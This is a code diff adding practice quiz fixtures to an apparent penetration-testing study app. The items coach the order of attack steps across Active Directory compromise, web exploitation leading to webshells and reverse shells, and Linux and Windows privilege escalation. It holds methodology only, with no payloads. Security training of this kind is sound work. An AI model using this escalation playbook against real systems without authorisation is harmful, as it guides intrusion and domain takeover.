+    'asrep-roast': { situation: 'Anonymous LDAP handed you a user list and the DC answers on 88. You still have no credentials.', choices: ['asrep-roast', 'password-spray', 'kerberoast', 'dcsync'], coach: { 'password-spray': 'Also valid off the user list — but it puts failed logons on the wire and risks lockout. AS-REP roasting gets crackable material with zero auth attempts, so it is the quieter opening move.', 'kerberoast': 'Kerberoasting needs valid credentials to request service tickets — you have none. AS-REP roasting is its no-creds cousin: same idea, but it targets pre-auth-disabled accounts you can ask for anonymously.', 'dcsync': 'Needs Domain Admin replication rights. This is the endgame, not step one.' } },
+    'crack-asrep': { situation: 'You captured a $krb5asrep$23$ hash for tgibson and copied it to your box.', choices: ['crack-asrep', 'password-spray', 'ad-acl-abuse', 'dcsync'], coach: { 'password-spray': 'You could spray, but you are holding a hash that may crack into a real password in seconds. Cash the hash you have first.', 'ad-acl-abuse': 'ACL abuse needs a mapped attack path (BloodHound) and usually a foothold credential — you are not there yet.', 'dcsync': 'Still needs Domain Admin. One cracked user is not that.' } },
+    'password-spray': { situation: 'You have a user list and the DC. AS-REP returned nothing roastable, so you try one seasonal password against everyone.', choices: ['password-spray', 'asrep-roast', 'kerberoast', 'dcsync'], coach: { 'asrep-roast': 'Worth trying first (it is quieter), but if it returned nothing roastable, a careful single-password spray is the reasonable next swing.', 'kerberoast': 'Still needs valid creds — which is exactly what the spray is trying to get you. Spray first, then roast service accounts.', 'dcsync': 'Needs Domain Admin. A sprayed low-priv login is not that.' } },
+    'ad-acl-abuse': { situation: 'You have a valid domain credential and BloodHound mapped a control path: your user has GenericAll over a privileged group.', choices: ['ad-acl-abuse', 'kerberoast', 'dcsync', 'asrep-roast'], coach: { 'kerberoast': 'Reasonable with creds in hand, but you are holding a direct control-path edge to privilege — walk the ACL path rather than gambling on a crackable service ticket.', 'dcsync': 'The right destination, but you need the replication rights first. The ACL abuse is how you get them.', 'asrep-roast': 'You are well past the no-creds opening now — you already have a credential and a path.' } },
+    'dcsync': { situation: 'An ACL path escalated you to a principal with domain replication rights.', choices: ['dcsync', 'ad-acl-abuse', 'kerberoast', 'password-spray'], coach: { 'ad-acl-abuse': 'That was the previous step — the one that got you the replication rights. You are past it now.', 'kerberoast': 'Why crack one service account when you can replicate every hash in the domain? You are beyond this.', 'password-spray': 'Far beneath where you are now — you hold replication rights over the whole domain.' } },
+    'content-discovery': { situation: 'You fingerprinted the web stack. Now you want to find what is actually reachable on the server.', choices: ['content-discovery', 'param-discovery', 'lfi-probe', 'recon-web-triage'], coach: { 'param-discovery': 'That comes after you have pages to test — first discover the endpoints, then fuzz each one for hidden parameters.', 'lfi-probe': 'You can only probe a parameter you have found. Map the site first.', 'recon-web-triage': 'Already done — you know the stack. Now enumerate its content.' } },
+    'param-discovery': { situation: 'Content discovery found /view.php but it renders blank with no obvious inputs.', choices: ['param-discovery', 'lfi-probe', 'content-discovery'], coach: { 'lfi-probe': 'You need a parameter to probe first — view.php showed none, so fuzz for hidden ones before testing traversal.', 'content-discovery': 'You already have the endpoint; now find its inputs.' } },
+    'lfi-probe': { situation: 'You found a page=... parameter on view.php. How do you test whether it is injectable?', choices: ['lfi-probe', 'file-upload', 'param-discovery'], coach: { 'file-upload': 'Different vector — only if there is an upload form. The page= parameter is begging for a traversal test first.', 'param-discovery': 'You already have the parameter; now exploit it.' } },
+    'file-upload': { situation: 'An upload form accepts files and you can reach /uploads/ in your browser.', choices: ['file-upload', 'web-shells', 'lfi-probe'], coach: { 'web-shells': 'That is the very next step — once the upload lands a webshell, upgrade it to a reverse shell. But first you have to get the file to execute.', 'lfi-probe': 'A different vector; you have a working upload path, so use it.' } },
+    'web-shells': { situation: 'You have code execution through a webshell but it is clunky — one command per request.', choices: ['web-shells', 'linux-enum', 'file-upload'], coach: { 'linux-enum': 'Right idea for after you have a proper shell — but upgrade the clunky webshell to an interactive reverse shell first, then enumerate.', 'file-upload': 'Already done — the upload gave you the webshell you are now upgrading.' } },
+    'linux-enum': { situation: 'You just landed an interactive shell as www-data. What is the very first thing you do?', choices: ['linux-enum', 'sudo-abuse', 'suid-gtfobins', 'cron-abuse'], coach: { 'sudo-abuse': 'You cannot know your sudo rights until you enumerate — run the sweep (or sudo -l) first, then act on what it shows.', 'suid-gtfobins': 'Same — enumerate to find which SUID binaries exist before trying to abuse one.', 'cron-abuse': 'You have not found a writable cron yet. Enumerate first; it will point you at the real vector.' } },
+    'sudo-abuse': { situation: 'Enumeration flagged your sudo rights. You run sudo -l and see a NOPASSWD entry.', choices: ['sudo-abuse', 'suid-gtfobins', 'cron-abuse', 'linux-enum'], coach: { 'suid-gtfobins': 'Valid if a SUID binary exists, but a NOPASSWD sudo entry on a GTFOBins binary is the cleanest, loudest-green path — take the sure thing.', 'cron-abuse': 'Slower and needs a writable cron; you are holding a direct NOPASSWD-to-root ticket.', 'linux-enum': 'Already done — enumeration is what handed you this sudo lead.' } },
+    'suid-gtfobins': { situation: 'Enumeration listed SUID binaries including /usr/bin/find, but you have no sudo rights.', choices: ['suid-gtfobins', 'sudo-abuse', 'pspy-monitor'], coach: { 'sudo-abuse': 'There are no sudo rights here — that path is closed. The SUID bit on a GTFOBins binary is the open door.', 'pspy-monitor': 'Worth running to catch cron jobs, but you already have a direct SUID-to-root binary in hand.' } },
+    'pspy-monitor': { situation: 'No sudo and no useful SUID binary. You suspect something runs on a schedule as root.', choices: ['pspy-monitor', 'cron-abuse', 'suid-gtfobins'], coach: { 'cron-abuse': 'That is the payoff — but first you need to see the job and confirm it runs as root and touches something you can write. pspy shows you that.', 'suid-gtfobins': 'Already checked — no usable SUID binary. Watch the process list instead.' } },
+    'cron-abuse': { situation: 'pspy showed a root cron running /opt/backup.sh every 2 minutes, and that file is world-writable.', choices: ['cron-abuse', 'pspy-monitor', 'sudo-abuse'], coach: { 'pspy-monitor': 'That was how you found the job — you are past it. Now abuse the writable script the job runs.', 'sudo-abuse': 'No sudo rights here; the writable root cron is the live path.' } },
+    'windows-enum': { situation: 'You have a shell as a low-privilege service account on Windows. First move?', choices: ['windows-enum', 'seimpersonate', 'unquoted-service-path', 'alwaysinstallelevated'], coach: { 'seimpersonate': 'You cannot know you hold SeImpersonate until you check — enumerate privileges first, then fire the potato.', 'unquoted-service-path': 'Only viable if such a service exists and a path is writable; the sweep tells you that.', 'alwaysinstallelevated': 'Same — it only works if both registry keys are set. Enumerate to confirm before acting.' } },
+    'seimpersonate': { situation: 'Enumeration shows your account has SeImpersonatePrivilege enabled.', choices: ['seimpersonate', 'unquoted-service-path', 'alwaysinstallelevated', 'windows-enum'], coach: { 'unquoted-service-path': 'A valid alternative if one exists — but when you already hold SeImpersonate, the potato is the fastest, most reliable route to SYSTEM.', 'alwaysinstallelevated': 'Also a path if the keys are set, but SeImpersonate is in hand right now.', 'windows-enum': 'Already done — that is what told you SeImpersonate is enabled.' } },
+    'unquoted-service-path': { situation: 'Enumeration flagged an unquoted service path, and you have no special privileges.', choices: ['unquoted-service-path', 'weak-service-permissions', 'seimpersonate'], coach: { 'weak-service-permissions': 'Related and worth checking, but that abuses service ACLs directly — here the win is the writable directory in the unquoted path.', 'seimpersonate': 'Only if you hold that privilege; this account does not. The unquoted path is the lead you have.' } },
+    'weak-service-permissions': { situation: 'accesschk shows your group has write access to a service configuration.', choices: ['weak-service-permissions', 'unquoted-service-path', 'alwaysinstallelevated'], coach: { 'unquoted-service-path': 'A different service-based trick; use it when the path is unquoted and a dir is writable. Here you can rewrite the service config directly — simpler.', 'alwaysinstallelevated': 'Only if the MSI keys are set. You already hold write access to a service.' } },
+    'alwaysinstallelevated': { situation: 'Enumeration shows AlwaysInstallElevated = 1. You check both hives to be sure.', choices: ['alwaysinstallelevated', 'seimpersonate', 'weak-service-permissions'], coach: { 'seimpersonate': 'Only if you hold that privilege; this path is a registry misconfig instead. Both keys being 0x1 is a free SYSTEM.', 'weak-service-permissions': 'A valid alternative when service ACLs are loose; here the MSI policy is the open door.' } },
+  };
+  Object.keys(PRACTICE).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) { var p = PRACTICE[k]; OBOL.STUDY_FIXTURES[k].situation = p.situation; OBOL.STUDY_FIXTURES[k].choices = p.choices; OBOL.STUDY_FIXTURES[k].coach = p.coach; } });
+
 })(typeof globalThis !== 'undefined' ? globalThis : this);
